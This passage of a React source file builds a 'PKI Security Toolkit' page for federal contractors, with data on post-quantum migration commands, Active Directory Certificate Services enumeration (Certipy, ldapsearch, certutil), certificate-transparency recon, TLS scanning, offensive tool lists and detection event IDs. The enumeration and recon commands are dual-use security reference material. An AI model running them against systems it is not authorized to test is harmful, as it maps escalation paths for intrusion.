      "Crypto-agility requirements: All new software and systems must be designed for crypto-agility — algorithm negotiation in code, not hardcoded. Audit all codebases for hardcoded RSA/ECDSA key size assumptions or algorithm OID dependencies.",
      "NSM-10 / CNSS Advisory: The National Security Memorandum on quantum computing (NSM-10, May 2022) directs NSS owners to develop PQC inventories. CNSS Advisory 02-22 mandates CNSA 2.0 algorithms (ML-KEM, ML-DSA, LMS/XMSS) for NSS by 2030.",
    ],
    commands: [
      "# Build OpenSSL with OQS provider (PQC support)",
      "git clone https://github.com/open-quantum-safe/oqs-provider",
      "cmake -DOPENSSL_ROOT_DIR=$(openssl version -d | cut -d'\"' -f2) ..",
      "make && sudo make install",
      "",
      "# Test ML-KEM-768 hybrid TLS handshake",
      "openssl s_client -connect pqc-server:443 -groups X25519MLKEM768",
      "",
      "# Generate ML-DSA-65 key pair",
      "openssl genpkey -algorithm mldsa65 -out mldsa65_key.pem",
      "openssl req -new -key mldsa65_key.pem -out mldsa65_csr.pem -subj '/CN=PQC Test'",
      "",
      "# Audit codebase for hardcoded algorithm references",
      'grep -r --include="*.py,*.java,*.go,*.cs" -E "(RSA|ECDSA|SHA256|2048|4096)" src/ | grep -v test',
    ],
    refs: ["NIST FIPS 203 (ML-KEM)", "NIST FIPS 204 (ML-DSA)", "NIST FIPS 205 (SLH-DSA)", "NSM-10", "CNSS Advisory 02-22", "CISA PQC Roadmap"],
  },
];

const reconData: Section[] = [
  {
    id: "ad-enum",
    icon: "🌲",
    color: COLORS.blue,
    colorDim: COLORS.blueDim,
    colorText: COLORS.blueText,
    label: "AD PKI Infrastructure Enumeration",
    category: "Internal Recon",
    severity: "",
    tools: [{ name: "Certipy" }, { name: "Certify" }, { name: "ldapsearch" }, { name: "certutil" }, { name: "PowerShell PKI" }],
    description:
      "Enumerate all Active Directory Certificate Services components: Certificate Authorities, published templates, enrollment endpoints, CA flags, ACLs, and NTAuthCertificates. Readable by any authenticated domain user.",
    detail: [
      "LDAP PKI containers: All PKI configuration is stored in the AD Configuration partition under CN=Public Key Services,CN=Services,CN=Configuration. Readable by any authenticated user without elevation.",
      "Key objects to enumerate: CN=Enrollment Services (CAs), CN=Certificate Templates, CN=NTAuthCertificates, CN=AIA (Authority Information Access), CN=CDP (CRL Distribution Points), CN=OID (Certificate Policies).",
      "CA flags: The flags attribute on the CA object reveals important config bits including EDITF_ATTRIBUTESUBJECTALTNAME2, availability of web enrollment, and LDAP enrollment.",
      "Template permissions: The Security Descriptor on each template reveals who can Read, Enroll, and AutoEnroll. Cross-reference enrollment principals against sensitive template EKUs.",
      "ACL inheritance: Templates inherit permissions from parent containers if not explicitly set — check parent CN=Certificate Templates ACL as well.",
    ],
    commands: [
      "# Certipy — full PKI enumeration with vuln detection",
      "certipy find -u user@corp.local -p pass -dc-ip 10.0.0.1 -vulnerable -output ./pki_audit",
      "# Generates: pki_audit.json, pki_audit.txt, pki_audit.html (BloodHound compatible)",
      "",
      "# LDAP — enumerate all CAs",
      'ldapsearch -H ldap://dc.corp.local -D user@corp.local -w pass -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" "(objectClass=pKIEnrollmentService)"',
      "",
      "# LDAP — enumerate all templates",
      'ldapsearch -H ldap://dc.corp.local -D user@corp.local -w pass -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" "(objectClass=pKICertificateTemplate)" cn msPKI-Cert-Template-OID msPKI-Enrollment-Flag msPKI-RA-Requirements nTSecurityDescriptor',
      "",
      "# certutil — list CAs and test connectivity",
      "certutil -TCAInfo",
      "certutil -config - -ping",
      'certutil -CATemplates -config "ca.corp.local\\CORP-CA"',
      "",
      "# PowerShell — get template ACLs",
      "Import-Module PSPKI",
      "Get-CertificateTemplate | Get-CertificateTemplateAcl | Where-Object {$_.Access.IdentityReference -match 'Domain Users'}",
    ],
    refs: ["SpecterOps: Certified Pre-Owned", "MS-WCCE (enrollment protocol)", "LDAP Schema for AD CS"],
  },
  {
    id: "external-enum",
    icon: "🌐",
    color: COLORS.blue,
    colorDim: COLORS.blueDim,
    colorText: COLORS.blueText,
    label: "External Certificate & CT Log Recon",
    category: "External Recon / OSINT",
    severity: "",
    tools: [{ name: "crt.sh" }, { name: "Censys" }, { name: "Shodan" }, { name: "subfinder" }, { name: "amass" }, { name: "certspotter" }],
    description:
      "Certificate Transparency logs provide a complete public record of all publicly-issued TLS certificates. Mine CT logs for target domains to discover shadow IT, dev environments, internal hostnames, and the full scope of a target's public PKI.",
    detail: [
      "SAN leakage: Many certificates include internal hostnames in Subject Alternative Names — vpn.internal.corp.gov, devdb.private.corp.gov, etc. These reveal internal network topology from CT log data, no access required.",
      "Wildcard scope definition: Wildcard certs (*.corp.gov) define scope boundaries. Enumerate all SANs adjacent to wildcards for edge-case targets missed by DNS enumeration.",
      "CA diversity discovery: Organizations using multiple CAs (Let's Encrypt for some services, DigiCert for others, internal CA for mTLS) reveal their PKI architecture via CT logs — without any internal access.",
      "Expired/revoked cert history: Historical CT log data shows certs that were revoked or expired — useful for identifying previously-exposed infrastructure, vendor relationships, and past security incidents.",
      "Rate of cert issuance: High cert issuance rates for a target domain may indicate automated CI/CD cert deployment, infrastructure expansion, or cert mismanagement worth investigating.",
    ],
    commands: [
      "# crt.sh — enumerate all certs for a domain",
      "curl -s 'https://crt.sh/?q=%.target.gov&output=json' | jq -r '.[] | [.issuer_name, .common_name, .not_before, .not_after] | @csv' | sort -u",
      "",
      "# Extract unique SANs from CT results",
      "curl -s 'https://crt.sh/?q=%.target.gov&output=json' | jq -r '.[].name_value' | sed 's/\\n/\\n/g' | sort -u | grep -v '*'",
      "",
      "# Censys — search for certs by org name",
      "censys search 'parsed.subject.organization: \"Target Corp\" AND parsed.validity.end: [now TO *]' --index certificates",
      "",
      "# subfinder — passive subdomain enum (uses CT logs)",
      "subfinder -d target.gov -all -silent | sort -u > subdomains.txt",
      "",
      "# amass — comprehensive CT + DNS recon",
      "amass enum -passive -d target.gov -src -ip -o amass_results.txt",
      "",
      "# certspotter — real-time CT log monitoring",
      "certspotter-cli watch --domain target.gov --email alerts@yourorg.com",
    ],
    refs: ["RFC 9162 (Certificate Transparency v2)", "crt.sh API docs", "Censys API docs"],
  },
  {
    id: "tls-assessment",
    icon: "🔍",
    color: COLORS.blue,
    colorDim: COLORS.blueDim,
    colorText: COLORS.blueText,
    label: "TLS Configuration Assessment",
    category: "Service Fingerprinting",
    severity: "",
    tools: [{ name: "testssl.sh" }, { name: "SSLyze" }, { name: "nmap ssl-*" }, { name: "openssl s_client" }, { name: "tlsx" }],
    description:
      "Assess TLS configuration of all services: cipher suites, protocol versions, certificate chain validity, OCSP stapling, HSTS, CAA, and key exchange parameters. Identify weak configurations, deprecated protocols, and misconfigured trust.",
    detail: [
      "Priority checks: TLS 1.0/1.1 enabled (POODLE/BEAST risk), RC4/3DES/EXPORT cipher suites (known-weak), certificate chain issues (expired intermediate, wrong trust anchor), missing OCSP stapling, SHA-1 signatures, keys <2048b RSA or <224b EC.",
      "HSTS audit: Check Strict-Transport-Security header presence, max-age (must be ≥31536000 for HSTS preloading), includeSubDomains, preload directives. Non-preloaded HSTS is bypassed on first visit.",
      "CAA record verification: DNS Certification Authority Authorization records restrict which CAs may issue for a domain. Federal domains should have explicit CAA records. Verify CAA policy matches actual CA usage.",
      "JA3/JA4 fingerprint collection: Capture TLS client hellos passively. JA3 fingerprints characterize TLS client implementations — useful for identifying malware C2, outdated clients, and non-compliant applications.",
      "Certificate chain completeness: Many servers omit intermediate CA certificates from TLS handshake — clients must fetch via AIA. In disconnected environments this breaks validation. Send complete chain always.",
    ],
    commands: [
      "# testssl.sh — comprehensive TLS assessment",
      "testssl.sh --full --json=results.json https://target.gov",
      "testssl.sh --severity HIGH --severity CRITICAL target.gov:443",
      "",
      "# SSLyze — batch assessment",
      "sslyze --regular --targets_in=hosts.txt --json_out=sslyze_results.json",
      "sslyze --robot target.gov  # Bleichenbacher (ROBOT) test",
      "",
      "# openssl — manual chain inspection",
      "openssl s_client -connect target.gov:443 -servername target.gov -showcerts < /dev/null 2>/dev/null",
      "echo | openssl s_client -connect target.gov:443 2>/dev/null | openssl x509 -noout -text | grep -E '(Subject|Issuer|Not|SAN|DNS)'",
      "",
      "# Check OCSP stapling",
      "openssl s_client -connect target.gov:443 -status < /dev/null 2>/dev/null | grep -A 20 'OCSP Response'",
      "",
      "# Check CAA DNS records",
      "dig CAA target.gov +short",
      "",
      "# Mass TLS scan (nmap)",
      "nmap -p 443,8443,636,3269,5986 --script ssl-cert,ssl-enum-ciphers,ssl-dh-params -oX tls_scan.xml 10.0.0.0/16",
    ],
    refs: ["NIST SP 800-52 Rev 2", "CAB Forum TLS BR", "Mozilla TLS Recommendations"],
  },
];

const referenceData = {
  standards: [
    { id: "SP800-57", title: "NIST SP 800-57 Part 1 Rev 5", scope: "Key Management", key: "RSA ≥3072b for new deployments. ECDSA P-384 preferred. Defines key lifecycle stages: pre-activation, active, deactivated, compromised, destroyed." },
    { id: "SP800-131A", title: "NIST SP 800-131A Rev 2", scope: "Algorithm Transitions", key: "SHA-1 disallowed for signatures after 2013. MD5 disallowed. 2TDEA disallowed. 112-bit security minimum for federal systems through 2030." },
    { id: "FIPS140-3", title: "FIPS 140-3", scope: "Cryptographic Modules", key: "Level 3 minimum for CA private key storage. Requires physical tamper-evidence, identity-based auth. Level 4 for extreme environments." },
    { id: "FIPS203", title: "NIST FIPS 203 (ML-KEM)", scope: "Post-Quantum KEM", key: "Module-Lattice Key Encapsulation Mechanism. Finalized Aug 2024. Replaces CRYSTALS-Kyber. Use ML-KEM-768 for most federal applications. ML-KEM-1024 for TOP SECRET/SCI." },
    { id: "FIPS204", title: "NIST FIPS 204 (ML-DSA)", scope: "Post-Quantum Signatures", key: "Module-Lattice Digital Signature Algorithm. Replaces CRYSTALS-Dilithium. ML-DSA-65 for standard use. ML-DSA-87 for highest classification." },
    { id: "FIPS205", title: "NIST FIPS 205 (SLH-DSA)", scope: "Post-Quantum Signatures", key: "Stateless Hash-Based Digital Signature Algorithm. Replaces SPHINCS+. Larger signatures but based only on hash function security. Good for root CA signing." },
    { id: "CNSS15", title: "CNSS Policy 15", scope: "NSS Cryptography", key: "CNSA Suite 2.0 for National Security Systems: AES-256, SHA-384, RSA-3072 (transition only), ECDSA P-384 (transition only), ML-KEM-1024, ML-DSA-87 by 2030." },
    { id: "CABFBR", title: "CAB Forum Baseline Requirements", scope: "Public TLS Certs", key: "Max 398-day cert validity. CT logging required for all public certs. Domain validation must be method-based. Effective Mar 2026: 90-day max validity proposed." },
    { id: "RFC5280", title: "RFC 5280", scope: "X.509 / PKI Profile", key: "Defines X.509 v3 certificate and CRL profile. The base specification for all PKI implementations." },
    { id: "RFC6960", title: "RFC 6960 (OCSP)", scope: "Revocation", key: "Online Certificate Status Protocol. OCSP stapling (RFC 6066) moves revocation check server-side. Must-Staple extension (RFC 7633) enforces stapling client-side." },
    { id: "RFC8555", title: "RFC 8555 (ACME)", scope: "Automation", key: "Automatic Certificate Management Environment. Enables fully automated cert issuance, renewal, revocation. ACME for internal CAs (Smallstep, EJBCA, Vault)." },
    { id: "DISA-PKI", title: "DISA PKI/PKE STIG", scope: "DoD Systems", key: "Mandatory for DoD and many federal contractors. Covers CA configuration, trust store management, CRL publication, HSM requirements, and operational procedures." },
  ],
  tools: [
    { name: "Certipy", category: "Off/Def", lang: "Python", use: "AD CS vulnerability finding, ESC1–16 exploitation, PKINIT auth, shadow credentials, CA backup extraction" },
    { name: "Certify", category: "Off/Def", lang: "C#", use: "AD CS enumeration, vulnerable template identification, certificate request automation" },
    { name: "Rubeus", category: "Off", lang: "C#", use: "PKINIT TGT requests, Pass-the-Certificate, Kerberos ticket manipulation, S4U abuse" },
    { name: "Mimikatz", category: "Off", lang: "C", use: "DPAPI key extraction, LSASS cert theft, crypto::certificates module" },
    { name: "SharpDPAPI", category: "Off", lang: "C#", use: "Targeted DPAPI master key and certificate extraction, domain DPAPI backup key abuse" },
    { name: "Impacket", category: "Off/Def", lang: "Python", use: "ntlmrelayx (ESC8), secretsdump, LDAP PKI queries, Kerberos tooling" },
    { name: "PetitPotam", category: "Off", lang: "Python/C", use: "Coerce NTLM authentication from DCs/servers for relay to AD CS enrollment endpoints" },
    { name: "testssl.sh", category: "Def/Recon", lang: "Bash", use: "Comprehensive TLS/SSL config audit, vulnerability checks, cipher suite enumeration" },
    { name: "SSLyze", category: "Def/Recon", lang: "Python", use: "TLS scanning, OCSP stapling verification, ROBOT test, batch assessment" },
    { name: "openssl", category: "All", lang: "C", use: "Swiss-army tool: cert inspection, OCSP, CA ops, key generation, chain verification, PKCS#11" },
    { name: "Zeek + JA4+", category: "Def", lang: "C++/Zeek", use: "Passive TLS fingerprinting, anomaly detection, certificate extraction from PCAP" },
    { name: "Smallstep step-ca", category: "Def", lang: "Go", use: "Open-source ACME/internal CA, short-lived cert automation, OIDC integration" },
    { name: "HashiCorp Vault PKI", category: "Def", lang: "Go", use: "Dynamic short-lived cert issuance, mTLS automation, integrates with k8s/cloud" },
    { name: "cert-manager", category: "Def", lang: "Go", use: "Kubernetes cert lifecycle automation, integrates with ACME/Vault/EJBCA/cloud CAs" },
    { name: "Venafi TLS Protect", category: "Def", lang: "Commercial", use: "Enterprise CLM — full visibility, policy enforcement, workflow automation" },
    { name: "crt.sh / Censys", category: "Recon", lang: "Web/API", use: "CT log search, external cert discovery, SAN enumeration, issuer analysis" },
    { name: "OQS-OpenSSL", category: "PQC", lang: "C", use: "OpenSSL provider with post-quantum algorithms for testing PQC migration" },
  ],
  eventIds: [
    { id: "4768", source: "Security", meaning: "Kerberos TGT requested", alert: "Filter PreAuthType=16 for PKINIT-based auth by privileged accounts" },
    { id: "4769", source: "Security", meaning: "Kerberos service ticket requested", alert: "Unusual service targets after PKINIT auth; S4U2self/S4U2proxy chains" },
    { id: "4886", source: "Security", meaning: "Cert request received by CA", alert: "Baseline enrollment volume; alert on off-hours or unusual requesters" },
    { id: "4887", source: "Security", meaning: "Certificate issued by CA", alert: "SAN ≠ requester UPN; privileged account templates; unusual template names" },
    { id: "4888", source: "Security", meaning: "Certificate request denied", alert: "High deny volume may indicate enumeration or failed ESC attempts" },
    { id: "4890", source: "Security", meaning: "CA settings changed", alert: "Any CA configuration change should match an approved change ticket" },
    { id: "4899", source: "Security", meaning: "Certificate template updated", alert: "Immediate alert — potential ESC4 exploitation; validate against change record" },
    { id: "4900", source: "Security", meaning: "Template security updated", alert: "ACL changes on templates — potential privilege escalation setup" },
    { id: "4882", source: "Security", meaning: "CA security permissions changed", alert: "Alert on all CA object ACL changes; validate against approved changes" },
    { id: "5136", source: "Security", meaning: "AD object attribute modified", alert: "Filter on msDS-KeyCredentialLink (shadow creds), NTAuthCertificates, template objects" },
  ],
};

const TabButton = ({ id, label, active, onClick }: { id: string; label: string; active: boolean; onClick: () => void }) => (
  <button
    onClick={onClick}
    style={{
      padding: "8px 16px",
      fontSize: "12px",
      fontWeight: active ? 600 : 400,
      fontFamily: "monospace",
      letterSpacing: "0.05em",
      textTransform: "uppercase",
      border: "none",
      borderBottom: active ? `2px solid ${COLORS.blue}` : "2px solid transparent",
      background: "transparent",
      color: active ? COLORS.blue : COLORS.textMid,
      cursor: "pointer",
      transition: "all 0.15s",
      whiteSpace: "nowrap",
    }}
  >
    {label}
  </button>
);

const Tag = ({ label, variant = "default" }: { label: string; variant?: "tool" | "cve" | "std" | "warn" | "default" }) => {
  const colors: Record<string, [string, string]> = {
    tool: [COLORS.blueDim, COLORS.blueText],
    cve: [COLORS.redDim, COLORS.redText],
    std: [COLORS.greenDim, COLORS.greenText],
    warn: [COLORS.amberDim, COLORS.amberText],
    default: ["#ffffff10", COLORS.textMid],
  };
  const [bg, fg] = colors[variant] || colors.default;
  return (
    <span style={{ background: bg, color: fg, padding: "2px 8px", borderRadius: "4px", fontSize: "11px", fontFamily: "monospace", fontWeight: 500 }}>
      {label}
    </span>
  );
};

const SeverityBadge = ({ level }: { level: string }) => {
  if (!level) return null;
  const color = level === "CRITICAL" ? COLORS.red : level === "HIGH" ? COLORS.amber : COLORS.textMid;
  const bg = level === "CRITICAL" ? COLORS.redDim : level === "HIGH" ? COLORS.amberDim : "#ffffff10";
  return (
    <span style={{ background: bg, color, padding: "2px 8px", borderRadius: "3px", fontSize: "10px", fontFamily: "monospace", fontWeight: 700, letterSpacing: "0.08em" }}>
      {level}
    </span>
  );
};

const CommandBlock = ({ lines }: { lines: string[] }) => (
  <pre
    style={{
      background: "#060810",
      border: `1px solid ${COLORS.border}`,
      borderRadius: "6px",
      padding: "12px 14px",
      fontSize: "11px",
      fontFamily: "monospace",
      color: "#c8d8e8",
      overflowX: "auto",
      lineHeight: 1.7,
      margin: "10px 0 0",
      whiteSpace: "pre",
    }}
  >
    {lines.map((line, i) => (
      <div key={i} style={{ color: line.startsWith("#") ? COLORS.teal : line === "" ? "transparent" : "#c8d8e8" }}>
        {line || " "}
      </div>
    ))}
  </pre>
);

const SectionCard = ({ section }: { section: Section }) => {
  const [expanded, setExpanded] = useState(false);
  return (
    <div
      style={{
        background: COLORS.bgCard,
        border: `1px solid ${expanded ? section.color + "50" : COLORS.border}`,
        borderRadius: "10px",
        marginBottom: "10px",
        overflow: "hidden",
        transition: "border-color 0.2s",
      }}
    >
      <button
        onClick={() => setExpanded(!expanded)}
        style={{
          width: "100%",
          background: "transparent",
          border: "none",
          padding: "14px 18px",
          cursor: "pointer",
          display: "flex",
          alignItems: "flex-start",
          gap: "12px",
          textAlign: "left",
        }}
      >
        <span style={{ fontSize: "20px", lineHeight: 1, flexShrink: 0, marginTop: "2px" }}>{section.icon}</span>
        <div style={{ flex: 1, minWidth: 0 }}>
          <div style={{ display: "flex", alignItems: "center", gap: "8px", flexWrap: "wrap", marginBottom: "4px" }}>
            <span style={{ fontSize: "13px", fontWeight: 600, color: COLORS.text }}>{section.label}</span>
            <SeverityBadge level={section.severity || ""} />
          </div>
          <div style={{ display: "flex", gap: "6px", flexWrap: "wrap", alignItems: "center" }}>
            <span style={{ fontSize: "11px", color: section.colorText, fontFamily: "monospace" }}>{section.category}</span>
          </div>
          <div style={{ fontSize: "12px", color: COLORS.textMid, marginTop: "6px", lineHeight: 1.5 }}>{section.description}</div>
        </div>
        <span style={{ color: COLORS.textDim, fontSize: "16px", flexShrink: 0, marginTop: "2px", transition: "transform 0.2s", transform: expanded ? "rotate(90deg)" : "none" }}>▶</span>
      </button>

      {expanded && (
        <div style={{ padding: "0 18px 18px", borderTop: `1px solid ${COLORS.border}` }}>
          <div style={{ marginTop: "14px" }}>
            <div style={{ fontSize: "11px", fontWeight: 600, color: COLORS.textDim, textTransform: "uppercase", letterSpacing: "0.08em", marginBottom: "8px" }}>Technical Detail</div>
            <ul style={{ margin: 0, paddingLeft: "16px" }}>
              {section.detail.map((d, i) => (
                <li key={i} style={{ fontSize: "12px", color: COLORS.textMid, lineHeight: 1.7, marginBottom: "6px" }}>
                  <span style={{ color: COLORS.text }}>{d.split("—")[0]}</span>
                  {d.includes("—") ? <span> — {d.split("—").slice(1).join("—")}</span> : null}
                </li>
              ))}
            </ul>
          </div>

          {section.commands && (
            <div style={{ marginTop: "14px" }}>
              <div style={{ fontSize: "11px", fontWeight: 600, color: COLORS.textDim, textTransform: "uppercase", letterSpacing: "0.08em", marginBottom: "4px" }}>Commands</div>
              <CommandBlock lines={section.commands} />
            </div>
          )}

          {section.mitigations && section.mitigations.length > 0 && (
            <div style={{ marginTop: "14px" }}>
              <div style={{ fontSize: "11px", fontWeight: 600, color: COLORS.greenText, textTransform: "uppercase", letterSpacing: "0.08em", marginBottom: "8px" }}>Mitigations</div>
              <ul style={{ margin: 0, paddingLeft: "16px" }}>
                {section.mitigations.map((m, i) => (
                  <li key={i} style={{ fontSize: "12px", color: COLORS.textMid, lineHeight: 1.7, marginBottom: "4px" }}>{m}</li>
                ))}
              </ul>
            </div>
          )}

          <div style={{ marginTop: "14px", display: "flex", gap: "6px", flexWrap: "wrap" }}>
            {section.tools.map((t) => <Tag key={t.name} label={t.name} variant="tool" />)}
            {section.refs?.map((r) => <Tag key={r} label={r} variant="std" />)}
          </div>
        </div>
      )}
    </div>
  );
};

export default function PKIToolkit() {
  const [activeTab, setActiveTab] = useState<TabId>("overview");

  const tabs: { id: TabId; label: string }[] = [
    { id: "overview", label: "Overview" },
    { id: "offensive", label: "Offensive" },
    { id: "defensive", label: "Defensive" },
    { id: "recon", label: "Recon & Enum" },
    { id: "crypto", label: "Crypto Policy" },
    { id: "reference", label: "Reference" },
  ];

  return (
    <div style={{ background: COLORS.bg, minHeight: "100vh", fontFamily: "'Courier New', monospace", color: COLORS.text }}>
      {/* Header */}
      <div style={{ borderBottom: `1px solid ${COLORS.border}`, padding: "20px 28px 0" }}>
        <div style={{ display: "flex", alignItems: "baseline", gap: "12px", marginBottom: "4px" }}>
          <span style={{ fontSize: "11px", fontFamily: "monospace", color: COLORS.teal, letterSpacing: "0.12em" }}>// FEDERAL CONTRACTOR PKI SECURITY TOOLKIT</span>
          <span style={{ fontSize: "10px", color: COLORS.textDim }}>v2.0 — CLASSIFIED USE AUTHORIZED</span>
        </div>
        <h1 style={{ fontSize: "22px", fontWeight: 700, color: "#ffffff", margin: "6px 0 16px", letterSpacing: "-0.5px" }}>
          PKI Security Toolkit
          <span style={{ fontSize: "12px", fontWeight: 400, color: COLORS.textMid, marginLeft: "12px" }}>Offensive · Defensive · Recon</span>
        </h1>
        <div style={{ display: "flex", gap: "0", overflowX: "auto" }}>
          {tabs.map((t) => <TabButton key={t.id} id={t.id} label={t.label} active={activeTab === t.id} onClick={() => setActiveTab(t.id)} />)}
        </div>
      </div>

      <div style={{ padding: "24px 28px", maxWidth: "1100px" }}>

        {/* OVERVIEW TAB */}
        {activeTab === "overview" && (
          <div>
            <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(200px, 1fr))", gap: "12px", marginBottom: "28px" }}>
              {[
                { label: "Attack Paths Covered", value: "16+", sub: "ESC1–ESC16 + TLS + CA", color: COLORS.red },
                { label: "Defensive Controls", value: "12", sub: "Hardening · CLM · PQC", color: COLORS.green },
                { label: "Federal Standards", value: "12", sub: "NIST · FIPS · CNSS · DoD", color: COLORS.blue },
                { label: "Detection Rules", value: "10+", sub: "Event IDs + SIEM queries", color: COLORS.amber },
              ].map((m) => (
                <div key={m.label} style={{ background: COLORS.bgCard, border: `1px solid ${COLORS.border}`, borderRadius: "10px", padding: "16px" }}>
                  <div style={{ fontSize: "11px", color: COLORS.textMid, marginBottom: "4px", textTransform: "uppercase", letterSpacing: "0.08em" }}>{m.label}</div>
                  <div style={{ fontSize: "28px", fontWeight: 700, color: m.color, lineHeight: 1 }}>{m.value}</div>
                  <div style={{ fontSize: "11px", color: COLORS.textDim, marginTop: "4px" }}>{m.sub}</div>
                </div>
              ))}
            </div>

            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "12px", marginBottom: "24px" }}>
              <div style={{ background: COLORS.bgCard, border: `1px solid ${COLORS.redDim}`, borderRadius: "10px", padding: "18px" }}>
                <div style={{ fontSize: "11px", color: COLORS.red, textTransform: "uppercase", letterSpacing: "0.08em", marginBottom: "10px", fontWeight: 600 }}>⚠ Critical Risk Areas</div>
                {["AD CS ESC1–ESC16 escalation paths", "Pass-the-Certificate / PKINIT persistence", "CA private key extraction (non-HSM)", "Rogue CA / Golden Certificate persistence", "NTLM relay to HTTP enrollment (ESC8)"].map((r) => (
                  <div key={r} style={{ fontSize: "12px", color: COLORS.textMid, padding: "5px 0", borderBottom: `1px solid ${COLORS.border}`, display: "flex", gap: "8px" }}>
                    <span style={{ color: COLORS.red, flexShrink: 0 }}>▸</span>{r}
                  </div>
                ))}
              </div>
              <div style={{ background: COLORS.bgCard, border: `1px solid ${COLORS.greenDim}`, borderRadius: "10px", padding: "18px" }}>
                <div style={{ fontSize: "11px", color: COLORS.green, textTransform: "uppercase", letterSpacing: "0.08em", marginBottom: "10px", fontWeight: 600 }}>✓ Priority Defensive Actions</div>
                {["Run Certipy find -vulnerable immediately", "Enable EPA on all AD CS enrollment endpoints", "Migrate all CA keys to FIPS 140-3 Level 3 HSM", "Enforce StrongCertificateBindingEnforcement=2", "Begin PQC migration inventory (NSM-10 directive)"].map((r) => (
                  <div key={r} style={{ fontSize: "12px", color: COLORS.textMid, padding: "5px 0", borderBottom: `1px solid ${COLORS.border}`, display: "flex", gap: "8px" }}>
                    <span style={{ color: COLORS.green, flexShrink: 0 }}>✓</span>{r}
                  </div>
                ))}
              </div>
            </div>

            <div style={{ background: COLORS.bgCard, border: `1px solid ${COLORS.amberDim}`, borderRadius: "10px", padding: "16px" }}>
              <div style={{ fontSize: "11px", color: COLORS.amber, textTransform: "uppercase", letterSpacing: "0.08em", marginBottom: "8px", fontWeight: 600 }}>⚡ Active Federal Directives — Act Now</div>
              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "8px" }}>
                {[
                  { directive: "NSM-10 (May 2022)", action: "Submit PQC migration inventory; begin transitioning NSS systems" },
                  { directive: "CNSS Advisory 02-22", action: "CNSA 2.0 algorithms mandatory for NSS by 2030 — begin planning" },
                  { directive: "CISA AA23-278A", action: "Remediate AD CS ESC vulnerabilities — high federal targeting confirmed" },
                  { directive: "KB5014754 (Oct 2022)", action: "StrongCertificateBindingEnforcement — full enforcement required" },
                ].map((d) => (
                  <div key={d.directive} style={{ padding: "10px", background: "#ffffff05", borderRadius: "6px" }}>
                    <div style={{ fontSize: "11px", color: COLORS.amberText, fontFamily: "monospace", fontWeight: 600 }}>{d.directive}</div>
                    <div style={{ fontSize: "11px", color: COLORS.textMid, marginTop: "3px", lineHeight: 1.5 }}>{d.action}</div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* OFFENSIVE TAB */}
        {activeTab === "offensive" && (
          <div>
            <div style={{ padding: "10px 14px", background: COLORS.redDim, border: `1px solid ${COLORS.red}40`, borderRadius: "8px", marginBottom: "20px", fontSize: "12px", color: COLORS.redText }}>
              ⚠ For authorized penetration testing, red team operations, and security research only. All techniques require written authorization.
            </div>
            {offensiveData.map((s) => <SectionCard key={s.id} section={s} />)}
          </div>
        )}

        {/* DEFENSIVE TAB */}
        {activeTab === "defensive" && (
          <div>
            {defensiveData.map((s) => <SectionCard key={s.id} section={s} />)}
          </div>
        )}

        {/* RECON TAB */}
        {activeTab === "recon" && (
          <div>
            {reconData.map((s) => <SectionCard key={s.id} section={s} />)}
          </div>
        )}

        {/* CRYPTO POLICY TAB */}
        {activeTab === "crypto" && (
          <div>
            <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(300px, 1fr))", gap: "10px", marginBottom: "20px" }}>
              {[
                { algo: "ML-KEM-768", type: "Key Encapsulation", status: "APPROVED", use: "Standard federal key exchange", fips: "FIPS 203", color: COLORS.green },
                { algo: "ML-KEM-1024", type: "Key Encapsulation", status: "NSS REQUIRED", use: "TOP SECRET / NSS environments", fips: "FIPS 203", color: COLORS.blue },
                { algo: "ML-DSA-65", type: "Digital Signature", status: "APPROVED", use: "Standard federal signing", fips: "FIPS 204", color: COLORS.green },
                { algo: "ML-DSA-87", type: "Digital Signature", status: "NSS REQUIRED", use: "TOP SECRET / NSS environments", fips: "FIPS 204", color: COLORS.blue },
                { algo: "SLH-DSA", type: "Hash-Based Signature", status: "APPROVED", use: "Root CA signing, long-term certs", fips: "FIPS 205", color: COLORS.green },
                { algo: "ECDSA P-384", type: "Classical Signature", status: "TRANSITION", use: "Use in hybrid until PQC deployed", fips: "CNSS Policy 15", color: COLORS.amber },
                { algo: "RSA-3072", type: "Classical", status: "TRANSITION", use: "Allowed for non-NSS through 2030", fips: "SP 800-131A", color: COLORS.amber },
                { algo: "SHA-1 / MD5", type: "Hash", status: "DISALLOWED", use: "Prohibited for all federal use", fips: "SP 800-131A", color: COLORS.red },
                { algo: "3DES / RC4", type: "Cipher", status: "DISALLOWED", use: "Prohibited — disable immediately", fips: "SP 800-131A", color: COLORS.red },
              ].map((a) => (
                <div key={a.algo} style={{ background: COLORS.bgCard, border: `1px solid ${COLORS.border}`, borderRadius: "8px", padding: "14px" }}>
                  <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start" }}>
                    <div>
                      <div style={{ fontSize: "14px", fontWeight: 700, color: "#fff", fontFamily: "monospace" }}>{a.algo}</div>
                      <div style={{ fontSize: "11px", color: COLORS.textMid, marginTop: "2px" }}>{a.type}</div>
                    </div>
                    <span style={{
                      fontSize: "10px", fontWeight: 700, padding: "2px 8px", borderRadius: "3px", fontFamily: "monospace", letterSpacing: "0.06em",
                      background: a.status === "APPROVED" ? COLORS.greenDim : a.status === "NSS REQUIRED" ? COLORS.blueDim : a.status === "TRANSITION" ? COLORS.amberDim : COLORS.redDim,
                      color: a.status === "APPROVED" ? COLORS.greenText : a.status === "NSS REQUIRED" ? COLORS.blueText : a.status === "TRANSITION" ? COLORS.amberText : COLORS.redText,
                    }}>
                      {a.status}
                    </span>
                  </div>
                  <div style={{ fontSize: "11px", color: COLORS.textMid, marginTop: "8px" }}>{a.use}</div>
                  <div style={{ fontSize: "10px", color: a.color, marginTop: "6px", fontFamily: "monospace" }}>{a.fips}</div>
                </div>
              ))}
            </div>

            <div style={{ background: COLORS.bgCard, border: `1px solid ${COLORS.border}`, borderRadius: "10px", padding: "18px" }}>
              <div style={{ fontSize: "12px", fontWeight: 600, color: COLORS.purpleText, marginBottom: "12px", textTransform: "uppercase", letterSpacing: "0.08em" }}>PQC Migration Roadmap for Federal Contractors</div>
              {[
